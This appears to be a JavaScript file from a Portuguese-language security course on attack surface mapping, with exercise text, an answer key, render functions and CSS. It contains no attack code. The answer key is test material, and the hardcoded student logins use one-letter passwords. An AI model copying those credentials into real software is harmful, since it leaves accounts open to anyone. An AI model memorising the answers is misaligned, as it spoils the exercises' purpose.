        titulo: 'Exercício 8 — Classificação Completa (12 itens)',
        cenario: '<p>Agora com 12 componentes — incluindo casos menos óbvios. Preste atenção nos itens que parecem ambíguos à primeira vista.</p>',
        pergunta: 'Classifique todos os 12 componentes entre <strong>É Superfície de Ataque</strong> e <strong>Não É Superfície de Ataque</strong>.',
        dica: 'Para casos limítrofes: o que importa é se o atacante tem acesso DIRETO ao componente, não se pode ser afetado indiretamente.'
    },
    sup9: {
        fase: 'sintese', faseLbl: 'Síntese', nivel: '🔴',
        titulo: 'Exercício 9 — Contando a Superfície',
        cenario: `<p>O MedConsulta tem os seguintes 8 componentes:</p>
<ol style="font-size:12px;line-height:2.2;padding-left:18px;margin:10px 0;">
    <li>Página de login para médicos e pacientes</li>
    <li>Formulário de agendamento de consultas</li>
    <li>API de disponibilidade sem autenticação (<code>GET /api/agenda</code>)</li>
    <li>Endpoint de upload de laudos PDF (<code>POST /laudos/upload</code>)</li>
    <li>Painel administrativo acessível sem autenticação (<code>/admin</code>)</li>
    <li>Banco de dados interno com prontuários (rede interna fechada, porta não exposta)</li>
    <li>Função de cálculo de honorários médicos (lógica interna do servidor)</li>
    <li>Chave de criptografia dos prontuários (armazenada internamente no servidor)</li>
</ol>`,
        pergunta: 'Quantos destes <strong>8 componentes</strong> fazem parte da superfície de ataque do MedConsulta?',
        dica: 'Identifique quais podem ser acessados ou manipulados diretamente por um usuário externo. Os componentes 6, 7 e 8 ficam na rede interna sem interface externa.'
    },
    sup10: {
        fase: 'sintese', faseLbl: 'Síntese', nivel: '🔴',
        titulo: 'Exercício 10 — Princípio de Redução de Superfície',
        cenario: `<p>O BancoPix ainda mantém ativo um endpoint legado:</p>
<div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:6px;padding:14px;margin:12px 0;">
    <code style="color:#DC2626;font-size:13px;">GET /api/v1/transferencia</code><br><br>
    <div style="font-size:12px;color:#374151;line-height:1.8;">
        → Versão antiga da API de transferências<br>
        → Não é mais chamado pelo app atual<br>
        → Ainda está ativo e acessível no servidor
    </div>
</div>
<p style="font-size:12px;">O time quer <strong>reduzir a superfície de ataque</strong> relacionada a este endpoint. Duas opções foram propostas:</p>
<ul style="font-size:12px;line-height:2;padding-left:18px;margin:8px 0;">
    <li><strong>A)</strong> Adicionar autenticação e validação mais rigorosa neste endpoint</li>
    <li><strong>B)</strong> Desativar e remover completamente este endpoint do servidor</li>
</ul>`,
        pergunta: 'Qual opção <strong>reduz mais efetivamente</strong> a superfície de ataque? Responda <strong>A</strong> ou <strong>B</strong>.',
        dica: 'Consulte "Redução de Superfície" na barra lateral. Lembre: um endpoint que não existe não pode ser explorado.'
    },
    sup11: {
        fase: 'ambiente', faseLbl: 'Ambiente', nivel: '🔴',
        titulo: 'Exercício 11 — Mapa do Ambiente (Homologação)',
        cenario: `<p>Você está conectado via VPN ao ambiente de homologação de um cliente. O diagrama abaixo mostra a infraestrutura completa. <strong>Do ponto de vista de um atacante externo</strong> — pela internet, sem VPN — identifique quais componentes fazem parte da superfície de ataque.</p>
<p style="font-size:12px;margin-top:8px;color:#92400e;background:#fef3c7;padding:8px 10px;border-radius:5px;">⚠️ Atenção: a <strong>API de Pagamentos</strong> é de um parceiro terceirizado — não pertence ao cliente e está fora do escopo do teste.</p>`,
        pergunta: 'Clique nos componentes que fazem parte da <strong>superfície de ataque do cliente</strong> (acessíveis externamente e dentro do escopo).',
        dica: 'Componentes de terceiros (API de parceiro) não são responsabilidade do cliente — não entram no escopo. Rede interna não é superfície externa.'
    },
    sup12: {
        fase: 'ambiente', faseLbl: 'Ambiente', nivel: '🔴',
        titulo: 'Exercício 12 — Ordenar o Processo de Mapeamento',
        cenario: `<p>Antes de qualquer análise de segurança, o testador mapeia a superfície de ataque seguindo uma ordem lógica. Os 5 passos abaixo estão <strong>embaralhados</strong>. Arraste para reordenar.</p>`,
        pergunta: 'Arraste os passos para colocá-los na <strong>sequência correta</strong> do processo de mapeamento de superfície de ataque.',
        dica: 'Você precisa saber o que existe antes de classificar; precisa classificar antes de documentar. Siga a lógica de descoberta → análise → registro.'
    },
    sup13: {
        fase: 'ambiente', faseLbl: 'Ambiente', nivel: '🔴',
        titulo: 'Exercício 13 — Sprint de Segurança',
        cenario: `<p>O time está na sprint planning. Abaixo estão 6 user stories do backlog. Como integrante do time com foco em segurança, identifique quais histórias <strong>criam novos pontos na superfície de ataque</strong> — ou seja, abrem novos canais de entrada de dados externos no sistema.</p>`,
        pergunta: 'Ative o toggle nas histórias que <strong>introduzem novos pontos na superfície de ataque</strong>.',
        dica: 'Uma história cria superfície quando abre canal de entrada de dados externos. Mudanças em lógica interna ou notificações de saída não criam nova superfície.'
    },
    sup14: {
        fase: 'ambiente', faseLbl: 'Ambiente', nivel: '🔴',
        titulo: 'Exercício 14 — Tela em Análise',
        cenario: `<p>A interface abaixo é de uma loja virtual que você está analisando. Identifique todos os elementos que aceitam entrada de dados — cada um é um ponto na superfície de ataque desta tela.</p>`,
        pergunta: 'Clique em todos os <strong>elementos que aceitam dados</strong> do usuário nesta interface.',
        dica: 'Um elemento é ponto de entrada se dados digitados ou selecionados são enviados ao servidor. Textos, imagens e listas estáticas (somente leitura) não são pontos de entrada.'
    },
    sup15: {
        fase: 'ambiente', faseLbl: 'Ambiente', nivel: '🔴',
        titulo: 'Exercício 15 — Completar o Relatório',
        cenario: `<p>O BancoPix foi analisado e tem estes componentes:</p>
<ul style="font-size:12px;line-height:2;padding-left:18px;margin:10px 0;">
    <li>Página de login (sem MFA)</li>
    <li>API de transferência (autenticada com token)</li>
    <li>Endpoint de relatório financeiro (<strong>sem autenticação</strong>)</li>
    <li>Endpoint de upload de comprovantes (autenticado)</li>
    <li>Painel administrativo (<strong>sem autenticação</strong>)</li>
</ul>
<p style="font-size:12px;">Complete o relatório de superfície de ataque selecionando o valor correto em cada campo.</p>`,
        pergunta: 'Selecione os valores corretos para completar o relatório.',
        dica: 'Conte todos os componentes que aceitam entrada externa (são 5). Dos que estão sem autenticação: relatório financeiro e painel admin. Qual causa maior impacto?'
    }
};

const RESPOSTAS_SUPERFICIE = {
    sup1:  ['2'],
    sup2:  ['3'],
    sup3:  ['superficie de ataque', 'superficie', 'attack surface', 'superficie de ataques'],
    sup4:  ['nao', 'não', 'n'],
    sup5:  ['sim', 's'],
    sup6:  ['sim', 's'],
    sup7:  'drag',
    sup8:  'drag',
    sup9:  ['5'],
    sup10: ['b', 'b desativar', 'b remover', 'desativar', 'remover', 'opcao b', 'opção b'],
    sup11: 'map',
    sup12: 'ordem',
    sup13: 'toggle',
    sup14: 'hotspot',
    sup15: 'blanks',
};

function normalizarRespostaSuperficie(s) {
    return String(s || '').normalize('NFD').replace(/[̀-ͯ]/g, '').toLowerCase().replace(/[^a-z0-9]/g, '');
}

const testesSuperficie = [
    { id: 'sup1',  nome: '1️⃣ Pontos de Entrada no Formulário' },
    { id: 'sup2',  nome: '2️⃣ Parâmetros de URL' },
    { id: 'sup3',  nome: '3️⃣ Nomeando o Conceito' },
    { id: 'sup4',  nome: '4️⃣ O Que Não É Superfície' },
    { id: 'sup5',  nome: '5️⃣ Upload como Ponto de Entrada' },
    { id: 'sup6',  nome: '6️⃣ Contexto Importa' },
    { id: 'sup7',  nome: '7️⃣ Classificação — 6 Itens' },
    { id: 'sup8',  nome: '8️⃣ Classificação — 12 Itens' },
    { id: 'sup9',  nome: '9️⃣ Contando a Superfície' },
    { id: 'sup10', nome: '🔟 Princípio de Redução' },
    { id: 'sup11', nome: '11. Mapa do Ambiente' },
    { id: 'sup12', nome: '12. Ordenar o Processo' },
    { id: 'sup13', nome: '13. Sprint de Segurança' },
    { id: 'sup14', nome: '14. Tela em Análise' },
    { id: 'sup15', nome: '15. Completar o Relatório' },
];

const ALUNOS_SUPERFICIE = [
    { usuario: 'antonio',  senha: 'M', nomeExibicao: 'Antonio M' },
    { usuario: 'laura',    senha: 'M', nomeExibicao: 'Laura M' },
    { usuario: 'max',      senha: 'C', nomeExibicao: 'Max C' },
    { usuario: 'sergio',   senha: 'B', nomeExibicao: 'Sérgio B' },
    { usuario: 'aline',    senha: 'B', nomeExibicao: 'Aline B' },
    { usuario: 'enzo',     senha: 'V', nomeExibicao: 'Enzo V' },
    { usuario: 'fernanda', senha: 'A', nomeExibicao: 'Fernanda A' },
    { usuario: 'maiara',   senha: 'M', nomeExibicao: 'Maiara M' },
    { usuario: 'paulo',    senha: 'B', nomeExibicao: 'Paulo B' }
];
const CREDENCIAIS_SUPERFICIE = {};
ALUNOS_SUPERFICIE.forEach(a => { CREDENCIAIS_SUPERFICIE[a.usuario] = a; });

function renderSidebarSuperficie() {
    return SUPERFICIE_CONCEITOS.map((c, i) => `
        <div class="surf-category">
            <div class="surf-cat-header" onclick="toggleConceito(${i})">
                <span class="surf-icon">${c.icone}</span>
                <span class="surf-cat-name">${c.nome}</span>
                <span class="surf-cat-arrow" id="sarrow-${i}">▶</span>
            </div>
            <div class="surf-cat-body" id="sconceito-${i}">
                <p>${c.descricao}</p>
                <p style="margin-top:7px;color:#92400e;font-style:italic;"><strong>Exemplo:</strong> ${c.exemplo}</p>
            </div>
        </div>
    `).join('');
}

function renderDragCard(teste, ex, idx, items) {
    const faseCor = '#DC2626';
    const itemsHtml = items.map(item => `
        <div class="drag-item" id="drag-${teste.id}-${item.id}" draggable="true"
             ondragstart="onDragStart(event,'${teste.id}','${item.id}')">
            ${escapeHtml(item.texto)}
        </div>
    `).join('');
    return `
        <div class="exercise-card" id="card-${teste.id}">
            <div class="card-meta">
                <span class="badge-fase" style="background:#DC262618;color:#DC2626;border:1px solid #DC262633;">${ex.nivel} ${ex.faseLbl}</span>
                <span class="badge-num">Exercício ${idx + 1} de 15</span>
                <span class="badge-check" id="check-${teste.id}">⬜</span>
            </div>
            <div class="card-titulo">${ex.titulo}</div>
            <div class="cenario-box">${ex.cenario}</div>
            <div class="pergunta-box">
                <p class="pergunta-text">${ex.pergunta}</p>
                <p class="dica-text">💡 ${ex.dica}</p>
                <div class="drag-pool" id="pool-${teste.id}"
                     ondragover="event.preventDefault()"
                     ondrop="onDrop(event,'${teste.id}','pool')">${itemsHtml}</div>
                <div class="drag-zones">
                    <div class="drag-zone drag-zone--sim" id="zone-sim-${teste.id}"
                         ondragover="event.preventDefault()"
                         ondrop="onDrop(event,'${teste.id}','sim')">
                        <div class="zone-label zone-label--sim">✅ É Superfície de Ataque</div>
                    </div>
                    <div class="drag-zone drag-zone--nao" id="zone-nao-${teste.id}"
                         ondragover="event.preventDefault()"
                         ondrop="onDrop(event,'${teste.id}','nao')">
                        <div class="zone-label zone-label--nao">❌ Não É Superfície de Ataque</div>
                    </div>
                </div>
                <button class="validar-btn" onclick="validarDrag('${teste.id}')">✅ Validar Classificação</button>
                <p class="feedback-text" id="fb-${teste.id}"></p>
            </div>
        </div>`;
}

function renderMapCard(teste, ex, idx) {
    const extItems = ITEMS_MAP_SUP11.filter(i => i.zona === 'ext');
    const intItems = ITEMS_MAP_SUP11.filter(i => i.zona === 'int');
    const renderComp = (item) => `
        <div class="map-comp" id="mapitem-${teste.id}-${item.id}" onclick="toggleMapItem('${teste.id}','${item.id}')">
            <span class="map-emoji">${item.emoji}</span>
            <span class="map-nome">${escapeHtml(item.nome)}</span>
        </div>`;
    return `
        <div class="exercise-card" id="card-${teste.id}">
            <div class="card-meta">
                <span class="badge-fase" style="background:#0891B218;color:#0891B2;border:1px solid #0891B233;">${ex.nivel} ${ex.faseLbl}</span>
                <span class="badge-num">Exercício ${idx + 1} de 15</span>
                <span class="badge-check" id="check-${teste.id}">⬜</span>
            </div>
            <div class="card-titulo">${ex.titulo}</div>
            <div class="cenario-box">${ex.cenario}</div>
            <div class="pergunta-box">
                <p class="pergunta-text">${ex.pergunta}</p>
                <p class="dica-text">💡 ${ex.dica}</p>
                <div class="env-map">
                    <div class="env-zone env-zone--ext">
                        <div class="env-zone-lbl">🌐 Zona Externa (acessível pela internet)</div>
                        <div class="env-comps">${extItems.map(renderComp).join('')}</div>
                    </div>
                    <div class="env-arrow-sep">🔥 Firewall 🔥</div>
                    <div class="env-zone env-zone--int">
                        <div class="env-zone-lbl">🔒 Rede Interna (apenas via VPN)</div>
                        <div class="env-comps">${intItems.map(renderComp).join('')}</div>
                    </div>
                </div>
                <button class="validar-btn" onclick="validarMapa('${teste.id}')">✅ Validar Mapeamento</button>
                <p class="feedback-text" id="fb-${teste.id}"></p>
            </div>
        </div>`;
}

function renderOrdemCard(teste, ex, idx, aluno) {
    const passos = shuffleParaAluno([...PASSOS_SUP12], aluno + teste.id);
    const itemsHtml = passos.map(p => `
        <div class="ordem-item" id="ordemitem-${teste.id}-${p.id}" data-id="${p.id}" draggable="true"
             ondragstart="ordemDragStart(event,'${p.id}')"
             ondragover="ordemDragOver(event,'${teste.id}','${p.id}')"
             ondragleave="ordemDragLeave(event)"
             ondrop="ordemDrop(event,'${teste.id}','${p.id}')">
            <span class="ordem-handle">⠿</span>
            <span>${escapeHtml(p.texto)}</span>
        </div>`).join('');
    return `
        <div class="exercise-card" id="card-${teste.id}">
            <div class="card-meta">
                <span class="badge-fase" style="background:#0891B218;color:#0891B2;border:1px solid #0891B233;">${ex.nivel} ${ex.faseLbl}</span>
                <span class="badge-num">Exercício ${idx + 1} de 15</span>
                <span class="badge-check" id="check-${teste.id}">⬜</span>
            </div>
            <div class="card-titulo">${ex.titulo}</div>
            <div class="cenario-box">${ex.cenario}</div>
            <div class="pergunta-box">
                <p class="pergunta-text">${ex.pergunta}</p>
                <p class="dica-text">💡 ${ex.dica}</p>
                <div class="ordem-list" id="ordem-list-${teste.id}">${itemsHtml}</div>
                <button class="validar-btn" onclick="validarOrdem('${teste.id}')">✅ Validar Sequência</button>
                <p class="feedback-text" id="fb-${teste.id}"></p>
            </div>
        </div>`;
}

function renderToggleCard(teste, ex, idx) {
    const storiesHtml = STORIES_SUP13.map(s => `
        <div class="story-card">
            <div class="story-header">
                <span class="story-tag">${s.tag}</span>
                <label class="toggle-sw">
                    <input type="checkbox" id="toggle-${teste.id}-${s.id}">
                    <span class="toggle-track"><span class="toggle-thumb"></span></span>
                </label>
            </div>
            <div class="story-text">${escapeHtml(s.texto)}</div>
        </div>`).join('');
    return `
        <div class="exercise-card" id="card-${teste.id}">
            <div class="card-meta">
                <span class="badge-fase" style="background:#0891B218;color:#0891B2;border:1px solid #0891B233;">${ex.nivel} ${ex.faseLbl}</span>
                <span class="badge-num">Exercício ${idx + 1} de 15</span>
                <span class="badge-check" id="check-${teste.id}">⬜</span>
            </div>
            <div class="card-titulo">${ex.titulo}</div>
            <div class="cenario-box">${ex.cenario}</div>
            <div class="pergunta-box">
                <p class="pergunta-text">${ex.pergunta}</p>
                <p class="dica-text">💡 ${ex.dica}</p>
                <div class="stories-list">${storiesHtml}</div>
                <button class="validar-btn" onclick="validarToggles('${teste.id}')">✅ Validar</button>
                <p class="feedback-text" id="fb-${teste.id}"></p>
            </div>
        </div>`;
}

function renderHotspotCard(teste, ex, idx) {
    return `
        <div class="exercise-card" id="card-${teste.id}">
            <div class="card-meta">
                <span class="badge-fase" style="background:#0891B218;color:#0891B2;border:1px solid #0891B233;">${ex.nivel} ${ex.faseLbl}</span>
                <span class="badge-num">Exercício ${idx + 1} de 15</span>
                <span class="badge-check" id="check-${teste.id}">⬜</span>
            </div>
            <div class="card-titulo">${ex.titulo}</div>
            <div class="cenario-box">${ex.cenario}</div>
            <div class="pergunta-box">
                <p class="pergunta-text">${ex.pergunta}</p>
                <p class="dica-text">💡 ${ex.dica}</p>
                <div class="ui-mock">
                    <nav class="ui-nav">
                        <div class="ui-hs" id="hs-${teste.id}-logo"    onclick="toggleHs('${teste.id}','logo')">🛒 ShopMed</div>
                        <div class="ui-hs ui-search" id="hs-${teste.id}-search" onclick="toggleHs('${teste.id}','search')">🔍 Buscar produto...</div>
                        <div class="ui-hs" id="hs-${teste.id}-login"  onclick="toggleHs('${teste.id}','login')">🔐 Login</div>
                        <div class="ui-hs" id="hs-${teste.id}-admin"  onclick="toggleHs('${teste.id}','admin')">⚙️ Área do Admin</div>
                    </nav>
                    <div class="ui-body">
                        <div class="ui-left">
                            <div class="ui-hs ui-filter" id="hs-${teste.id}-filter" onclick="toggleHs('${teste.id}','filter')">
                                🎚️ Filtrar por preço<br><small style="color:#6B7280;">R$ 0 — R$ 500 (envia parâm. ao servidor)</small>
                            </div>
                        </div>
                        <div class="ui-right">
                            <div class="ui-hs ui-listing" id="hs-${teste.id}-listing" onclick="toggleHs('${teste.id}','listing')">
                                📦 Produto A — R$ 49,90<br>
                                📦 Produto B — R$ 89,90<br>
                                📦 Produto C — R$ 129,90<br>
                                <small style="color:#6B7280;">(listagem, somente leitura)</small>
                            </div>
                        </div>
                    </div>
                    <div class="ui-footer-area">
                        <div class="ui-hs ui-form" id="hs-${teste.id}-form" onclick="toggleHs('${teste.id}','form')">
                            📬 Fale Conosco: [ Nome ] [ E-mail ] [ Mensagem ] [ Enviar ]
                        </div>
                        <div class="ui-hs ui-copy" id="hs-${teste.id}-copy" onclick="toggleHs('${teste.id}','copy')">
                            © 2024 ShopMed. Todos os direitos reservados.
                        </div>
                    </div>
                </div>
                <p style="font-size:11px;color:#6B7280;margin-top:6px;">Clique nos elementos para selecionar/desmarcar</p>
                <button class="validar-btn" onclick="validarHotspot('${teste.id}')">✅ Validar Seleção</button>
                <p class="feedback-text" id="fb-${teste.id}"></p>
            </div>
        </div>`;
}

function renderBlanksCard(teste, ex, idx) {
    const sel = (b) => `<select id="blank-${teste.id}-${b.id}" class="blank-sel">${b.opcoes.map(o => `<option value="${escapeHtml(o)}">${escapeHtml(o)}</option>`).join('')}</select>`;
    const [b1, b2, b3, b4] = BLANKS_SUP15;
    return `
        <div class="exercise-card" id="card-${teste.id}">
            <div class="card-meta">
                <span class="badge-fase" style="background:#0891B218;color:#0891B2;border:1px solid #0891B233;">${ex.nivel} ${ex.faseLbl}</span>
                <span class="badge-num">Exercício ${idx + 1} de 15</span>
                <span class="badge-check" id="check-${teste.id}">⬜</span>
            </div>
            <div class="card-titulo">${ex.titulo}</div>
            <div class="cenario-box">${ex.cenario}</div>
            <div class="pergunta-box">
                <p class="pergunta-text">${ex.pergunta}</p>
                <p class="dica-text">💡 ${ex.dica}</p>
                <div class="report-tpl">
                    <div class="report-header">📄 Relatório de Superfície de Ataque — BancoPix</div>
                    <p>Foram identificados <strong>${sel(b1)} pontos de entrada</strong> totais na superfície de ataque.</p>
                    <p>Destes, <strong>${sel(b2)} estão expostos sem autenticação</strong>, representando risco imediato de acesso não autorizado.</p>
                    <p>O componente de maior risco é o <strong>${sel(b3)}</strong>, pois está sem autenticação e expõe dados sensíveis de administração.</p>
                    <p>A ação prioritária de redução de superfície recomendada é <strong>${sel(b4)}</strong>.</p>
                </div>
                <button class="validar-btn" onclick="validarBlanks('${teste.id}')">✅ Validar Relatório</button>
                <p class="feedback-text" id="fb-${teste.id}"></p>
            </div>
        </div>`;
}

function renderCardSuperficie(teste, idx, aluno) {
    const ex = CONTEUDO_SUPERFICIE[teste.id];
    const faseCorMap = { observacao: '#3B82F6', diferenciacao: '#D97706', classificacao: '#DC2626', sintese: '#7C3AED', ambiente: '#0891B2' };
    const faseCor = faseCorMap[ex.fase] || '#374151';
    if (ex.fase === 'classificacao') {
        const base = teste.id === 'sup7' ? ITEMS_DRAG_SUP7 : ITEMS_DRAG_SUP8;
        return renderDragCard(teste, ex, idx, shuffleParaAluno([...base], aluno + teste.id));
    }
    if (ex.fase === 'ambiente') {
        if (teste.id === 'sup11') return renderMapCard(teste, ex, idx);
        if (teste.id === 'sup12') return renderOrdemCard(teste, ex, idx, aluno);
        if (teste.id === 'sup13') return renderToggleCard(teste, ex, idx);
        if (teste.id === 'sup14') return renderHotspotCard(teste, ex, idx);
        if (teste.id === 'sup15') return renderBlanksCard(teste, ex, idx);
    }
    return `
        <div class="exercise-card" id="card-${teste.id}">
            <div class="card-meta">
                <span class="badge-fase" style="background:${faseCor}18;color:${faseCor};border:1px solid ${faseCor}33;">${ex.nivel} ${ex.faseLbl}</span>
                <span class="badge-num">Exercício ${idx + 1} de 15</span>
                <span class="badge-check" id="check-${teste.id}">⬜</span>
            </div>
            <div class="card-titulo">${ex.titulo}</div>
            <div class="cenario-box">${ex.cenario}</div>
            <div class="pergunta-box">
                <p class="pergunta-text">${ex.pergunta}</p>
                <p class="dica-text">💡 ${ex.dica}</p>
                <input type="text" id="resp-${teste.id}" class="resp-input" placeholder="Digite sua resposta...">
                <button class="validar-btn" onclick="validarSuperficie('${teste.id}')">✅ Validar</button>
                <p class="feedback-text" id="fb-${teste.id}"></p>
            </div>
        </div>`;
}

function renderExerciciosSuperficie(aluno) {
    return shuffleParaAluno([...testesSuperficie], aluno)
        .map((t, i) => renderCardSuperficie(t, i, aluno)).join('');
}

const estiloSuperficie = `
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family: sans-serif; background: #FFF5F5; }
    .container { display:flex; min-height:100vh; }
    .sidebar { width:270px; background:#fff; padding:18px 14px; border-right:2px solid #FECACA; position:sticky; top:0; height:100vh; overflow-y:auto; display:flex; flex-direction:column; }
    .sidebar-brand { margin-bottom:14px; }
    .sidebar-brand h2 { font-size:15px; color:#7F1D1D; margin-bottom:3px; }
    .sidebar-brand p { font-size:12px; color:#64748B; }
    .contador-box { background:#fef2f2; border-radius:8px; padding:10px 12px; margin-bottom:14px; border:1px solid #fecaca; }
    .contador-box p { font-size:13px; font-weight:700; color:#DC2626; }
    .surf-section-title { font-size:10px; font-weight:700; color:#94A3B8; text-transform:uppercase; letter-spacing:0.07em; margin-bottom:6px; }
    .surf-hint { font-size:11px; color:#6B7280; margin-bottom:10px; line-height:1.5; }
    .surf-category { margin-bottom:5px; }
    .surf-cat-header { display:flex; align-items:center; gap:8px; padding:8px 10px; border-radius:6px; cursor:pointer; border:1px solid #e2e8f0; background:#f8fafc; user-select:none; transition:background 0.15s; }
    .surf-cat-header:hover { background:#fef2f2; border-color:#fecaca; }
    .surf-cat-header.open { background:#fef2f2; border-color:#fca5a5; border-radius:6px 6px 0 0; }
    .surf-icon { font-size:16px; flex-shrink:0; }
    .surf-cat-name { font-size:12px; font-weight:600; color:#374151; flex:1; }
    .surf-cat-arrow { font-size:10px; color:#94A3B8; }
    .surf-cat-body { display:none; padding:10px; background:#fff5f5; border:1px solid #fca5a5; border-top:none; border-radius:0 0 6px 6px; font-size:11px; color:#374151; line-height:1.65; }
    .surf-cat-body.open { display:block; }
    .sidebar-actions { margin-top:auto; padding-top:14px; border-top:1px solid #E2E8F0; }
    .btn-reset { display:block; width:100%; text-align:center; padding:9px; background:#6c757d; color:white; border:none; border-radius:5px; cursor:pointer; font-size:12px; font-weight:600; margin-bottom:6px; }
    .btn-logout { display:block; text-align:center; padding:9px; background:#374151; color:white; text-decoration:none; border-radius:5px; font-size:12px; margin-bottom:6px; }
    .btn-hub { display:block; text-align:center; padding:8px; color:#6B7280; text-decoration:none; font-size:12px; }
    .main { flex:1; padding:22px 28px; max-width:780px; }
    .main-header { background:linear-gradient(135deg,#DC2626,#B91C1C); color:white; padding:16px 20px; border-radius:10px; margin-bottom:20px; }
    .main-header h2 { font-size:17px; margin-bottom:4px; }
    .main-header p { font-size:12px; opacity:0.85; }
    .exercise-card { background:white; border-radius:10px; padding:18px 20px; margin-bottom:16px; border:2px solid #E2E8F0; transition:border-color 0.2s,box-shadow 0.2s; }
    .exercise-card.concluido { border-color:#22C55E; box-shadow:0 0 0 3px rgba(34,197,94,0.08); }
    .card-meta { display:flex; gap:8px; align-items:center; margin-bottom:10px; flex-wrap:wrap; }
    .badge-fase { font-size:11px; font-weight:600; padding:3px 9px; border-radius:999px; }
    .badge-num { font-size:11px; color:#94A3B8; margin-left:auto; }
    .badge-check { font-size:16px; }
    .card-titulo { font-size:14px; font-weight:700; color:#111827; margin-bottom:12px; }
    .cenario-box { font-size:12.5px; color:#374151; line-height:1.75; margin-bottom:14px; background:#F8FAFC; border-radius:6px; padding:12px 14px; border-left:3px solid #FCA5A5; }
    .pergunta-box { border:1px solid #FECACA; border-radius:7px; padding:14px; }
    .pergunta-text { font-size:13px; font-weight:600; color:#7F1D1D; margin-bottom:6px; }
    .dica-text { font-size:11px; color:#6B7280; margin-bottom:10px; font-style:italic; line-height:1.5; }
    .resp-input { width:100%; padding:9px; border:1px solid #CBD5E1; border-radius:5px; font-size:13px; margin-bottom:8px; }
    .resp-input:focus { outline:none; border-color:#FCA5A5; box-shadow:0 0 0 2px rgba(220,38,38,0.15); }
    .validar-btn { padding:9px 20px; background:#DC2626; color:white; border:none; border-radius:5px; font-weight:700; cursor:pointer; font-size:13px; transition:background 0.15s; }
    .validar-btn:hover { background:#B91C1C; }
    .feedback-text { margin-top:8px; font-size:12px; min-height:18px; }
    pre { white-space:pre-wrap; word-break:break-word; }
    code { background:#F1F5F9; padding:1px 5px; border-radius:3px; font-size:11.5px; }
    .drag-pool { display:flex; flex-wrap:wrap; gap:8px; min-height:52px; padding:10px; margin-bottom:12px; background:#f8fafc; border:2px dashed #CBD5E1; border-radius:8px; }
    .drag-item { background:white; border:2px solid #e2e8f0; border-radius:6px; padding:8px 12px; font-size:12px; color:#374151; cursor:grab; user-select:none; line-height:1.4; transition:border-color 0.15s,box-shadow 0.15s; }
    .drag-item:hover { border-color:#DC2626; box-shadow:0 2px 8px rgba(220,38,38,0.12); }
    .drag-item:active { cursor:grabbing; }
    .drag-zones { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:12px; }
    .drag-zone { min-height:100px; padding:10px; border-radius:8px; border:2px dashed; display:flex; flex-direction:column; gap:6px; }
    .drag-zone--sim { background:#f0fdf4; border-color:#86efac; }
    .drag-zone--nao { background:#fef2f2; border-color:#fca5a5; }
    .zone-label { font-size:11px; font-weight:700; padding-bottom:6px; border-bottom:1px solid currentColor; margin-bottom:4px; opacity:0.8; }
    .zone-label--sim { color:#15803D; }
    .zone-label--nao { color:#DC2626; }
    @media(max-width:600px){.drag-zones{grid-template-columns:1fr;}}

    /* Map exercise (sup11) */
    .env-map{display:flex;flex-direction:column;gap:10px;margin-bottom:12px;}
    .env-zone{border-radius:8px;padding:12px;}
    .env-zone--ext{background:#FFF7ED;border:2px solid #FED7AA;}
    .env-zone--int{background:#EFF6FF;border:2px solid #BFDBFE;}
    .env-zone-lbl{font-size:11px;font-weight:700;color:#374151;margin-bottom:10px;}
    .env-arrow-sep{text-align:center;font-size:12px;color:#6B7280;font-weight:600;padding:4px 0;}
    .env-comps{display:flex;flex-wrap:wrap;gap:8px;}
    .map-comp{display:flex;flex-direction:column;align-items:center;gap:4px;padding:10px 14px;background:white;border:2px solid #e2e8f0;border-radius:8px;cursor:pointer;user-select:none;transition:all 0.15s;text-align:center;min-width:110px;}
    .map-comp:hover{border-color:#0891B2;box-shadow:0 2px 8px rgba(8,145,178,0.12);}
    .map-comp.selected{border-color:#DC2626;background:#fef2f2;}
    .map-comp.mapa-erro{border-color:#f97316;background:#fff7ed;}
    .map-emoji{font-size:22px;}
    .map-nome{font-size:11px;font-weight:600;color:#374151;}

    /* Order exercise (sup12) */
    .ordem-list{display:flex;flex-direction:column;gap:6px;margin-bottom:12px;}
    .ordem-item{display:flex;align-items:center;gap:10px;padding:10px 14px;background:white;border:2px solid #e2e8f0;border-radius:6px;cursor:grab;user-select:none;font-size:12px;color:#374151;transition:border-color 0.15s,box-shadow 0.15s;}
    .ordem-item:active{cursor:grabbing;}
    .ordem-item.drag-over{border-color:#DC2626;border-style:dashed;background:#fef2f2;}
    .ordem-handle{font-size:16px;color:#CBD5E1;flex-shrink:0;}

    /* Toggle exercise (sup13) */
    .stories-list{display:flex;flex-direction:column;gap:8px;margin-bottom:12px;}
    .story-card{background:white;border:1px solid #e2e8f0;border-radius:8px;padding:12px 14px;}
    .story-header{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:8px;}
    .story-tag{font-size:10px;font-weight:700;color:#0891B2;background:#e0f2fe;padding:2px 7px;border-radius:999px;white-space:nowrap;}
    .story-text{font-size:12px;color:#374151;line-height:1.5;}
    .toggle-sw{position:relative;display:inline-block;width:44px;height:24px;flex-shrink:0;}
    .toggle-sw input{opacity:0;width:0;height:0;position:absolute;}
    .toggle-track{position:absolute;top:0;left:0;right:0;bottom:0;background:#CBD5E1;border-radius:12px;transition:background 0.2s;cursor:pointer;}
    .toggle-track:after{content:'';position:absolute;height:18px;width:18px;left:3px;bottom:3px;background:white;border-radius:50%;transition:transform 0.2s;}
    .toggle-sw input:checked + .toggle-track{background:#DC2626;}
    .toggle-sw input:checked + .toggle-track:after{transform:translateX(20px);}

    /* Hotspot exercise (sup14) */
    .ui-mock{border:2px solid #e2e8f0;border-radius:8px;overflow:hidden;margin-bottom:12px;background:#f8fafc;font-size:12px;}
    .ui-nav{display:flex;align-items:center;gap:6px;padding:8px 12px;background:white;border-bottom:1px solid #e2e8f0;flex-wrap:wrap;}
    .ui-search{flex:1;min-width:120px;}
    .ui-body{display:grid;grid-template-columns:160px 1fr;gap:8px;padding:10px;}
    .ui-filter{line-height:1.6;}
    .ui-listing{line-height:1.8;}
    .ui-footer-area{display:flex;gap:8px;padding:8px 10px;border-top:1px solid #e2e8f0;flex-wrap:wrap;}
    .ui-form{flex:1;}
    .ui-hs{padding:8px 10px;border-radius:5px;cursor:pointer;color:#374151;border:2px solid transparent;transition:all 0.15s;user-select:none;}
    .ui-hs:hover{border-color:#CBD5E1;background:#f1f5f9;}
    .ui-hs.hs-selected{border-color:#DC2626;background:#fef2f2;color:#7F1D1D;}
    .ui-hs.hs-erro{border-color:#f97316;background:#fff7ed;}
    @media(max-width:500px){.ui-body{grid-template-columns:1fr;}}

